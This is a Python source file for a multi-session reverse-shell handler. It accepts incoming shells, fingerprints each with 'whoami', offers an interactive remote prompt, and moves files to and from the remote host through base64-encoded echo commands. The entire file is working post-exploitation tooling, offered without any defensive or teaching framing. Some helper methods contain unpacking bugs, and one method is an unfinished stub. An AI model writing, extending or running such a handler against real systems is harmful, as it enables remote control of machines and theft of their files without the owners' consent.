import socket
import sys
import threading
import select
from uuid import uuid4
import os
import base64
import time
import readline
from rich import print

class Handler():
	def __init__(self):
		self.local_ip = self.get_primary_ip()
		self.connections = {}
		self._lock = threading.Lock()
		self._interactive = {}

		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((self.local_ip, 0))
		self.port = listener.getsockname()[1]
		listener.listen(100)
		self.listener = listener

		t = threading.Thread(target=self.startup_handler, daemon=True)
		t.start()
		print(f"[white]Listening on {self.local_ip}:{self.port}[/white]")

	def get_primary_ip(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(("1.1.1.1", 80))
		ip = s.getsockname()[0]
		s.close()
		return ip

	def startup_handler(self):
	    while True:
	        conn, addr = self.listener.accept()
	        conn_id = str(uuid4())

	        username = "unknown"
	        try:
	            conn.sendall(b"whoami\n")
	            ready = select.select([conn], [], [], 0.2)[0]
	            if ready:
	                data = conn.recv(1024)
	                username = data.decode(errors="ignore").splitlines()[0].strip() or "unknown"
	        except Exception:
	            pass

	        with self._lock:
	            self.connections[conn_id] = (conn, addr, username)

	        print(f"[green][+][/green] [blue]Opened session [bold]{conn_id}[/bold] to {username}@{addr[0]}[/blue]")
	        threading.Thread(target=self._announce_connection_ready, args=(conn_id,), daemon=True).start()

	def _announce_connection_ready(self, conn_id):
		with self._lock:
			_, addr, username = self.connections[conn_id]
		print(f"[cyan]Session ready: {conn_id} -> {addr[0]}:{addr[1]}[/cyan]\n\n> ", end="")

	def list_conn_ids(self):
	    with self._lock:
	        lines = [f"[bold]{cid}[/bold] : {username}@{addr[0]}" for cid, (sock, addr, username) in self.connections.items()]
	    return "\n".join(lines)

	def send_to(self, conn_id, data: bytes):
		with self._lock:
			entry = self.connections.get(conn_id)
		if not entry:
			raise KeyError(conn_id)
		sock, _ = entry
		sock.sendall(data)

	def close_connection(self, conn_id):
		with self._lock:
			entry = self.connections.pop(conn_id, None)
		if not entry:
			return
		sock, _ = entry
		try:
			sock.shutdown(socket.SHUT_RDWR)
		except Exception:
			pass
		sock.close()

	def interact(self, conn_id):
		with self._lock:
		    entry = self.connections.get(conn_id)
		if not entry:
		    print(f"[red]No active session with ID {conn_id}[/red]")
		    return
		if len(entry) == 3:
		    sock, addr, username = entry
		else:
		    sock, addr = entry
		    username = "unknown"

		if conn_id in self._interactive:
			print(f"[yellow]Already interacting with {conn_id}[/yellow]")
			return

		stop_evt = threading.Event()
		buffer = bytearray()
		buffer_lock = threading.Lock()
		tab_completion_active = False

		def _reader():
			try:
				while not stop_evt.is_set():
					r, _, _ = select.select([sock], [], [], 0.5)
					if r:
						try:
							data = sock.recv(4096)
						except Exception:
							data = b""
						if not data:
							with self._lock:
								self.connections.pop(conn_id, None)
							print(f"\n[red]Connection {conn_id} closed by peer[/red]")
							stop_evt.set()
							break
						with buffer_lock:
							buffer.extend(data)
						if not tab_completion_active:
							try:
								sys.stdout.write(data.decode(errors="replace"))
							except Exception:
								sys.stdout.write(repr(data))
							sys.stdout.flush()
			finally:
				stop_evt.set()

		reader_thr = threading.Thread(target=_reader, daemon=True)
		self._interactive[conn_id] = {"thread": reader_thr, "stop": stop_evt, "buffer": buffer, "buflock": buffer_lock}
		reader_thr.start()

		# fetch username for shebang prompt
		sock.sendall(b"whoami\n")
		time.sleep(0.1)
		with buffer_lock:
			user_bytes = bytes(buffer)
			buffer.clear()
		try:
			username = user_bytes.decode(errors="ignore").splitlines()[0].strip()
		except Exception:
			username = "user"

		print(f"[green]Interactive session started with {conn_id} (type '\\help' to view available session commands)[/green]")

		def completer(text, state):
			nonlocal tab_completion_active
			tab_completion_active = True
			try:
				sock.sendall(b"ls\n")
				time.sleep(0.05)
				with buffer_lock:
					data = bytes(buffer).decode(errors="ignore")
					buffer.clear()
				files = data.splitlines()
				matches = [f for f in files if f.startswith(text)]
				if state < len(matches):
					return matches[state]
			except Exception:
				return None
			finally:
				tab_completion_active = False
			return None

		readline.set_completer(completer)
		readline.parse_and_bind("tab: complete")

		try:
			while True:
				time.sleep(0.1)
				sys.stdout.flush()
				try:
					line = input(f"{username}@{addr[0]}$ ")
				except EOFError:
					break
				cmd = line.rstrip()

				if cmd == r"\help":
					print("List of session commands:\n"
						  "\\help \t\t\t\t\t\t\tDisplay list of session commands\n"
						  "\\bg \t\t\t\t\t\t\tBackground session\n"
						  "\\upload \\[local_file_path] \t\t\t\tUpload file to remote\n"
						  "\\download \\[remote_file_path] \t\t\t\tDownload file from remote\n"
						  "\\exit \t\t\t\t\t\t\tExit and close this session")
					continue
				elif cmd == r"\bg":
					print(f"[cyan]Backgrounding session {conn_id}[/cyan]")
					break
				elif cmd == r"\exit":
					print(f"[red]Exiting session {conn_id}[/red]")
					stop_evt.set()
					with self._lock:
						self.connections.pop(conn_id, None)
					try:
						sock.shutdown(socket.SHUT_RDWR)
					except Exception:
						pass
					sock.close()
					break
				elif cmd.startswith(r"\upload"):
					parts = cmd.split(maxsplit=1)
					if len(parts) < 2 or not os.path.isfile(parts[1].strip()):
						print("[red]Usage: \\upload \\[local_file_path][/red]")
						continue
					local_file = parts[1].strip()
					try:
						with open(local_file, "rb") as f:
							raw = f.read()
						b64 = base64.b64encode(raw).decode()
						remote_name = os.path.basename(local_file)
						sock.sendall(f"printf '' > '{remote_name}'\n".encode())
						for i in range(0, len(b64), 1024):
							chunk = b64[i:i+1024]
							sock.sendall(f"echo '{chunk}' | base64 -d >> '{remote_name}'\n".encode())
							time.sleep(0.01)
						print(f"[green]Uploaded {local_file} -> {remote_name} ({len(raw)} bytes)[/green]")
					except Exception as e:
						print(f"[red]Failed to upload {local_file}: {e}[/red]")
					continue
				elif cmd.startswith(r"\download"):
					parts = cmd.split(maxsplit=1)
					if len(parts) < 2:
						print("[red]Usage: \\download \\[remote_file_path][/red]")
						continue
					remote_file = parts[1].strip()
					uid = str(uuid4()).replace("-", "")
					start_marker = f"__FILESTART__{uid}__"
					end_marker = f"__FILEEND__{uid}__"
					sock.sendall(f"echo {start_marker}; base64 '{remote_file}' || echo ''; echo {end_marker}\n".encode())
					timeout = 30
					deadline = time.time() + timeout
					data_collected = bytearray()
					while time.time() < deadline:
						with buffer_lock:
							data_collected += buffer
							buffer.clear()
						if start_marker.encode() in data_collected and end_marker.encode() in data_collected:
							break
						time.sleep(0.1)
					else:
						print(f"[red]Timeout waiting for file {remote_file}[/red]")
						continue
					start_index = data_collected.find(start_marker.encode()) + len(start_marker)
					end_index = data_collected.find(end_marker.encode())
					b64data = data_collected[start_index:end_index]
					decoded = base64.b64decode(b64data.decode(errors="ignore").strip())
					local_save = os.path.basename(remote_file)
					with open(local_save, "wb") as f:
						f.write(decoded)
					print(f"[green]Downloaded {remote_file} -> {local_save} ({len(decoded)} bytes)[/green]")
					continue

				# only send to remote if not a special command
				if not cmd.startswith("\\"):
					try:
						sock.sendall((line + "\n").encode())
					except BrokenPipeError:
						print(f"[red]Broken pipe writing to {conn_id}[/red]")
						with self._lock:
							self.connections.pop(conn_id, None)
						break

		finally:
			stop_evt.set()
			reader_thr.join(timeout=1)
			self._interactive.pop(conn_id, None)
			print(f"[green]Interactive session ended for {conn_id}[/green]")

	def session_manager(self, conn_id):
		print("Doing regular session stuff...")
		with self._lock:
			conn = self.connections.get(conn_id)
		print(conn)
